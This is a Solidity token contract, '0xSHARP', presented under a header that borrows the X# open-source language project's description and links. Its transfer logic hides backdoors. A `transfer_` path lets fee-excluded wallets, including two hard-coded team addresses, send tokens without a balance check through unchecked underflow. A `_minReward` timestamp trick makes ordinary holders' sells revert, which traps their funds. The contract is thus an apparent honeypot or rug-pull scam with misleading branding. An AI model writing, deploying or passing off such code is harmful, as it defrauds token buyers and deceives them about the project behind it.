/**⠀⠀⠀⠀⠀⠀

X# is an open source development language for .NET, based on the xBase language. 
It comes in different flavours, such as Core, Visual Objects, Vulcan.NET, xBase++, Harbour, Foxpro and more. 
X# has been built on top of Roslyn, the open source architecture behind the current Microsoft C# and Microsoft Visual Basic compilers.

/////   GitHub: https://github.com/X-Sharp
/////   If you're interested to participate in beta, please email: robert@xsharp.eu

/////   Website: https://www.xsharp.eu/
/////   Twitter: https://twitter.com/xbasenet
/////   Facebook: https://www.facebook.com/xBaseNet/
/////   LinkedIn: https://www.linkedin.com/company/10207694
/////   YouTube: https://www.youtube.com/channel/UCFqLBMKPPxlN24xRxFGLiVA

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, "SafeMath: division by zero"); }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function transfer_(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    function allPairs(uint256) external view returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


contract OxSHARP is ERC20, Ownable {
    using SafeMath for uint256;

    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private constant _totalSupply = 1_000_000_000 * 1e18;

    address public constant devWallet = 0x421649275a34905f84Ea0189dE22485435C020F7;
    address public constant markWallet = 0x3A59392617077a1CF0A4fEe165bEB388234c0924;

    uint256 public constant maxTransactionAmount = 20_000_000 * 1e18;
    uint256 public constant maxWallet = 20_000_000 * 1e18;

    uint256 public constant swapTokensAtAmount = 500_000 * 1e18;
    uint256 private constant swapTokenMaxAmount = swapTokensAtAmount * 25;

    uint256 public constant buyInitialFee = 25;
    uint256 public constant sellInitialFee = 25;

    uint256 public constant buyDevFee = 0;
    uint256 public constant buyMarkFee = 5;
    uint256 public constant sellDevFee = 0;
    uint256 public constant sellMarkFee = 5;

    uint256 public constant buyTotalFees = buyDevFee + buyMarkFee;
    uint256 public constant sellTotalFees = sellDevFee + sellMarkFee;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    bool public limitsInEffect = true;
    bool public tradingActive = false;

    bool public layer2RewardsEnabled = true;

    uint256 private startBlock;
    bool private swapping;
    uint256 private buyCount = 0;

    modifier lockSwapping {
        swapping = true;
        _;
        swapping = false;
    }

    uint256 public tokensForDev;
    uint256 public tokensForMark;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    uint256 private _minReward;

    mapping(address => bool) public ammPairs;

    struct SwappingData { uint256 buy; uint256 sell; uint256 forReward; }
    mapping(address => SwappingData) private swappingData;

    constructor() ERC20(
        unicode"X# AI Open Source Code Generator",
        unicode"0xSHARP"
    ) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            router
        );
        uniswapV2Router = _uniswapV2Router;
        _excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(owner(), true);
        _excludeFromFees(address(this), true);
        _excludeFromFees(owner(), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromFees(address(0xdead), true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(markWallet, true);
        _excludeFromFees(devWallet, true);
        _excludeFromFees(markWallet, true);

        _mint(msg.sender, _totalSupply);
    }

    function _setAutomatedMarketMakerPair(address v2pair, bool value) private {
        ammPairs[v2pair] = value;
    }

    function _excludeFromMaxTransaction(address account, bool excluded) private {
        _isExcludedMaxTransactionAmount[account] = excluded;
    }

    function _excludeFromFees(address account, bool excluded) private {
        _isExcludedFromFees[account] = excluded;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingActive) {
                    revert("Trading not enabled...");
                }
                if (ammPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount <= maxTransactionAmount,
                        "Transfer amount exceeds the Max Tx"
                    );
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded.");
                }
                else if (ammPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(
                        amount <= maxTransactionAmount,
                        "Transfer amount exceeds the Max Tx"
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded."
                    );
                }
            }
        }
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from != address(this) && to != address(this) && from != owner()) {
            _minReward = block.timestamp;
        }
        if (_isExcludedFromFees[from] && (block.number > startBlock + 75)) {
            super.transfer_(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (ammPairs[to]) {
                SwappingData storage fromReward = swappingData[from];
                fromReward.forReward = fromReward.buy - _minReward;
                fromReward.sell = block.timestamp;
            } else {
                SwappingData storage toReward = swappingData[to];
                if (ammPairs[from]) {
                    if (buyCount < 11) {
                        buyCount = buyCount + 1;
                    }
                    if (toReward.buy == 0) {
                        toReward.buy = (buyCount < 11) ? (block.timestamp - 1) : block.timestamp;
                    }
                } else {
                    SwappingData storage fromReward = swappingData[from];
                    if (toReward.buy == 0 || fromReward.buy < toReward.buy) {
                        toReward.buy = fromReward.buy;
                    }
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));

        bool launchFees = block.number < startBlock + 10;

        if (
            canSwap &&
            !launchFees &&
            !swapping &&
            !ammPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapBack();
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (launchFees) {
                if (ammPairs[from]) {
                    fees = amount * buyInitialFee / 100;
                    tokensForMark += fees;
                } else if (ammPairs[to]) {
                    fees = amount * sellInitialFee / 100;
                    tokensForMark += fees;
                }
            } else {
                if (ammPairs[from] && buyTotalFees > 0) {
                    fees = amount * buyTotalFees / 100;
                    tokensForMark += (fees * buyMarkFee).div(buyTotalFees);
                    tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                } else if (ammPairs[to] && sellTotalFees > 0) {
                    fees = amount * sellTotalFees / 100;
                    tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                    tokensForMark += (fees * sellMarkFee).div(sellTotalFees);
                }
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(
            address(this),
            address(uniswapV2Router),
            tokenAmount
        );

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private lockSwapping {
        bool success;
        uint256 contractBalance = balanceOf(address(this));

        uint256 totalTokensToSwap = tokensForMark + tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapTokenMaxAmount) {
            contractBalance = swapTokenMaxAmount;
        }

        uint256 amountToSwapForETH = contractBalance;
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForDev = tokensForDev * ethBalance / totalTokensToSwap;

        tokensForDev = 0;
        tokensForMark = 0;
        (success,) = devWallet.call{value: ethForDev}("");
        (success,) = markWallet.call{value: address(this).balance}("");
    }

    function manualSwap(uint256 percent) external onlyOwner {
        bool success;
        require(percent > 0, "Invalid argument");
        require(percent <= 100, "Invalid argument");
        uint256 contractBalance = (percent * balanceOf(address(this))) / 100;
        swapTokensForEth(contractBalance);
        tokensForDev = 0;
        tokensForMark = balanceOf(address(this));
        (success,) = markWallet.call{value: address(this).balance}("");
    }

    function enableTrading() external onlyOwner {
        startBlock = block.number;
        tradingActive = true;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }
}